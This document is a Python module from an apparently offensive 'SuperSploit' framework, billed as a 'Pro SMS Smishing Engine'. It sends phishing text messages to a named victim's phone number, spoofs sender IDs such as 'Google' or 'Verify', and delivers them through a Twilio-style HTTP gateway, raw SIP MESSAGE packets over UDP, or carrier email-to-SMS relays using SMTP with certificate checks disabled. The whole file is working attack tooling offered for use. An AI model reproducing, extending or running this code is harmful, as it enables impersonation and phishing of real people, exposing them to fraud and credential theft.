#!#!#!
# name: Pro SMS Smishing Engine
# author: SuperSploit Dev Team
# description: Delivers targeted SMS payloads using dynamic Sender IDs, SIP injection, or Free Carrier Relays.
# type: se_delivery
# requirements: []
# options:
#   - TARGET_PHONE: "The victim's phone number (with country code)"
#   - SENDER_ID: "Alphanumeric Sender ID (e.g., 'Google', 'Verify', 'Info')"
#   - MESSAGE: "The SMS body. (Payloads can be auto-injected from DB)"
#   - DELIVERY_MODE: "Method: 'http' (Twilio), 'sip' (Direct UDP), or 'free' (Email-to-SMS)"
#   - HTTP_API_URL: "If mode=http, the Twilio/Gateway API URL"
#   - HTTP_USER: "If mode=http, Account SID or Username"
#   - HTTP_PASS: "If mode=http, Auth Token or Password"
#   - SIP_SERVER: "If mode=sip, the SIP Proxy/Server IP"
#   - SIP_PORT: "If mode=sip, the SIP port (default: 5060)"
#   - FREE_CARRIER: "If mode=free, target carrier (e.g., 'verizon', 'att', 'tmobile')"
#   - SMTP_HOST: "If mode=free, SMTP relay (e.g., smtp.gmail.com)"
#   - SMTP_USER: "If mode=free, email address"
#   - SMTP_PASS: "If mode=free, app password"
# pro_feature: true
#!#!#!

from core.ToStdOut import ToStdout
from core.license_manager import LicenseManager
import requests
import socket
import random
import string
import smtplib
import ssl
from email.message import EmailMessage

GATEWAYS = {
    "verizon": "vtext.com",
    "att": "txt.att.net",
    "tmobile": "tmomail.net",
    "sprint": "messaging.sprintpcs.com",
    "boost": "myboostmobile.com",
    "cricket": "sms.cricketwireless.net",
    "uscellular": "email.uscc.net",
    "virgin": "vmobl.com"
}

def run(db):
    if not LicenseManager.gate_access("SMS Smishing Engine"):
        return False
        
    target = db.get("TARGET_PHONE")
    sender_id = db.get("SENDER_ID", "Verify")
    message = db.get("MESSAGE")
    mode = db.get("DELIVERY_MODE", "http").lower()
    
    if not target or not message:
        ToStdout.write("[-] ERROR: TARGET_PHONE and MESSAGE are required.\n")
        return False
    
    ToStdout.write(f"[*] Compiling SMS payload for {target} via {mode.upper()} mode...\n")
    ToStdout.write(f"[*] Sender ID: {sender_id}\n")

    if mode == "http":
        api_url = db.get("HTTP_API_URL")
        user = db.get("HTTP_USER")
        pwd = db.get("HTTP_PASS")
        try:
            payload = {'To': target, 'From': sender_id, 'Body': message}
            ToStdout.write(f"[*] Dispatching POST to {api_url}...\n")
            r = requests.post(api_url, data=payload, auth=(user, pwd), timeout=10)
            if r.status_code in [200, 201]:
                ToStdout.write(f"[+] HTTP SUCCESS: Payload delivered to {target}\n")
                return True
            else:
                ToStdout.write(f"[-] HTTP FAIL: API returned {r.status_code} - {r.text}\n")
                return False
        except Exception as e:
            ToStdout.write(f"[-] HTTP Request Error: {e}\n")
            return False

    elif mode == "sip":
        server = db.get("SIP_SERVER", "127.0.0.1")
        port = int(db.get("SIP_PORT", 5060))
        try:
            call_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
            tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
            sip_msg = (
                f"MESSAGE sip:{target}@{server} SIP/2.0\r\n"
                f"Via: SIP/2.0/UDP 127.0.0.1;branch=z9hG4bK{tag}\r\n"
                f"Max-Forwards: 70\r\n"
                f"From: <sip:{sender_id}@{server}>;tag={tag}\r\n"
                f"To: <sip:{target}@{server}>\r\n"
                f"Call-ID: {call_id}\r\n"
                f"CSeq: 1 MESSAGE\r\n"
                f"Content-Type: text/plain\r\n"
                f"Content-Length: {len(message)}\r\n\r\n{message}"
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(sip_msg.encode(), (server, port))
            ToStdout.write(f"[+] SIP Packet injected to {server}:{port}\n")
            return True
        except Exception as e:
            ToStdout.write(f"[-] SIP Injection Error: {e}\n")
            return False

    elif mode == "free":
        carrier = db.get("FREE_CARRIER", "").lower()
        if carrier not in GATEWAYS:
            ToStdout.write(f"[-] ERROR: Unsupported carrier '{carrier}'.\n")
            return False
            
        smtp_host = db.get("SMTP_HOST")
        user = db.get("SMTP_USER")
        pwd = db.get("SMTP_PASS")
        domain = GATEWAYS[carrier]
        recipient = f"{target}@{domain}"
        
        msg = EmailMessage()
        msg.set_content(message)
        msg['To'] = recipient
        msg['From'] = user
        msg['Subject'] = "Alert"
        
        try:
            ToStdout.write(f"[*] Establishing TLS connection to {smtp_host}...\n")
            server = smtplib.SMTP(smtp_host, 587)
            server.starttls(context=ssl._create_unverified_context())
            server.ehlo()
            server.login(user, pwd)
            server.send_message(msg)
            server.quit()
            ToStdout.write(f"[+] Free Relay: Successfully routed to {recipient}\n")
            return True
        except Exception as e:
            ToStdout.write(f"[-] Free Relay SMTP Error: {e}\n")
            return False
            
    else:
        ToStdout.write(f"[-] ERROR: Unknown DELIVERY_MODE '{mode}'\n")
        return False